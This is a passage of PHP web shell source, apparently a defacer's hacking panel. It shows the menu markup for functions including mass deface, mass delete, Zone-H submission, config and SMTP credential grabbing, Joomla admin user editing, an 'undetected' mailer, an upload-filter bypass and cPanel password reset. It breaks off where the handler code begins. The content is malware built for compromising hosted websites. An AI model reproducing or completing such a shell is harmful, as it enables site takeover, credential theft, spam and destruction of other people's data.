...
<div class='text-center'>
	<div class='btn-group'>
	    <a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?'></i>HOME</a>
		<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?upload&path=$path'></i>UPLOAD</a>
		<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?mass_deface&path=$path'></i>MASS DEFACE</a>
		<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=zoneh'>ZONE-H</a>
		<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=defacer'>DEFACER ID</a>
		<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?mass_delete&path=$path'></i>MASS DELETE</a>
		<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&web=jumping'>JUMPING</a>
		<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=config'>GRAB CONFIG</a>
		<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=edit_user'>AUTO EDIT USER JOOMLA</a>
	</div>
	<div class='text-center'>
	<div class='btn-group'>
	<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=adminer'>ADMINER</a>
	<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=smtp'>GRAB SMTP</a>
	<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=mailer'>MAILER UNDETECTED</a>
	<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=uploader'>BYPASS PHP UPLOADER</a>
	<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=resetcpanelpw'>CPANEL RESET PASSWORD</a>
	<a style=color:red;margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=unzip'>UNZIP</a>
	</div>
</div>";
// tools nya
if(isset($_GET['path'])) {
